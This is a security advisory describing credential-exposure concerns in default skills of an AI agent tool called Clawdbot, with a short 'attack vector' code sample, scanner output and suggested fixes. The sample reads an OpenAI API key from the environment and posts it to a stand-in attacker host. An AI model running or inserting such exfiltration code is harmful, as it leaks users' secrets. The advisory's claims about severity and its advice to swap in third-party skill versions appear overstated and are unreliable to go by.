# 🚨 CRITICAL SECURITY ADVISORY: Clawdbot Default Skills Vulnerability

**Date**: February 16, 2026  
**Severity**: CRITICAL  
**Affected Versions**: All current Clawdbot installations  
**CVE**: Pending

## Executive Summary

Clawdbot ships with multiple skills containing critical security vulnerabilities that expose API credentials to unauthorized access. These vulnerabilities are identical to those that caused the recent Moltbook breach resulting in 1.5M tokens being exposed.

## Affected Skills

### 1. oracle (CRITICAL)
- **Location**: `/opt/homebrew/lib/node_modules/clawdbot/skills/oracle`
- **Issue**: Automatically reads `OPENAI_API_KEY` from environment variables
- **Impact**: Any code running on the system can steal OpenAI API keys

### 2. openai-image-gen (CRITICAL)
- **Location**: `/opt/homebrew/lib/node_modules/clawdbot/skills/openai-image-gen`
- **Issue**: Reads API keys from environment in `scripts/gen.py`
- **Impact**: Credential exposure through environment variable access

## Technical Details

### Vulnerability Pattern
```python
# INSECURE - Current implementation
api_key = os.environ.get('OPENAI_API_KEY')  # Any process can read this!
```

### Attack Vector
```python
# How attackers exploit this
import os
import requests

# Steal credentials
stolen_key = os.environ.get('OPENAI_API_KEY')

# Exfiltrate
requests.post('https://attacker.com/steal', json={'key': stolen_key})
```

## Real-World Impact

This vulnerability pattern is responsible for:
- **Moltbook Breach**: 1.5M tokens exposed, $400K+ in damages
- **Supply Chain Risk**: Every new Clawdbot installation is vulnerable
- **Widespread Exposure**: Affects all users who haven't manually secured their skills

## Proof of Concept

Using the ASF Security Scanner on a fresh Clawdbot installation:
```bash
$ python3 asf-skill-scanner-v1.py
...
oracle          🚨 DANGER    Accesses .env files
                            References sensitive data
openai-image-gen 🚨 DANGER   scripts/gen.py: Accesses .env files
...
SECURITY SCORE: 0/100
```

## Recommended Fix

### Immediate Actions

1. **Remove automatic environment variable reading** from all skills
2. **Implement secure credential storage** using Clawdbot's auth system
3. **Update all affected skills** with secure versions

### Secure Implementation Example
```javascript
// SECURE - Using Clawdbot auth
const { getAuthProfile } = require('@clawdbot/auth');
const auth = await getAuthProfile('openai');
const apiKey = auth.api_key;  // Encrypted, permission-controlled
```

## Mitigation for Users

Until patches are released:

1. **Install ASF Scanner**: https://github.com/jeffvsutherland/asf-security-scanner
2. **Run security audit**: `python3 asf-skill-scanner-v1.py`
3. **Replace vulnerable skills** with secure versions from ASF repository
4. **Never store API keys** in environment variables

## Secure Versions Available

We've created secure versions of affected skills:
- https://github.com/jeffvsutherland/asf-security-scanner/tree/main/asf-secure-skills

## Timeline

- **Feb 10, 2026**: Moltbook breach demonstrates vulnerability impact
- **Feb 15, 2026**: ASF scanner identifies same vulnerabilities in Clawdbot
- **Feb 16, 2026**: Secure versions developed and tested
- **Feb 16, 2026**: This advisory issued

## Credit

Discovered by Jeff Sutherland and Agent Saturday as part of the Agent Security Framework (ASF) project.

## Contact

For questions or secure skill implementations:
- Jeff Sutherland (Frequency Foundation)
- Agent Saturday (ASF Product Owner)

## References

- ASF Security Scanner: https://github.com/jeffvsutherland/asf-security-scanner
- Moltbook Breach Analysis: [Internal ASF Documentation]
- OWASP Credential Management: https://owasp.org/www-community/vulnerabilities/

---

**Disclosure**: This advisory is being shared publicly due to the critical nature of the vulnerability and its active exploitation in the wild. Immediate action is required to prevent further breaches.